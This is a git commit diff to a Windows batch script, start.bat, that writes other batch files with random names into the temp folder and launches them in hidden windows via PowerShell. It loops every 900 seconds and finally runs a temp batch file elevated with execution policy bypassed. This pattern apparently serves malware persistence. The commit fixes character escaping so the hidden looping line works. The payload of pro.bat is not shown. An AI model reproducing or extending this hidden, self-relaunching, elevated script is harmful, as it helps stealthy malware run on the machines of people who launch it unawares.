6a5da14a19d4e3764f77f8113b58aef7f6337d69
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-06 06:16:08 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -129,7 +129,7 @@ echo echo    ) ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo    goto loop ^>^> pro.bat^ >> nihbtdtdow.bat
 
 echo powershell -c "Start-Process -FilePath "%%temp%%\pro.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
-echo timeout /t 900 /nobreak >nul >> nihbtdtdow.bat
+echo timeout ^/t 900 ^/nobreak ^>nul >> nihbtdtdow.bat
 echo goto loop  >> nihbtdtdow.bat
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\nivbtdtdow.bat' -WindowStyle Hidden -Verb RunAs}"
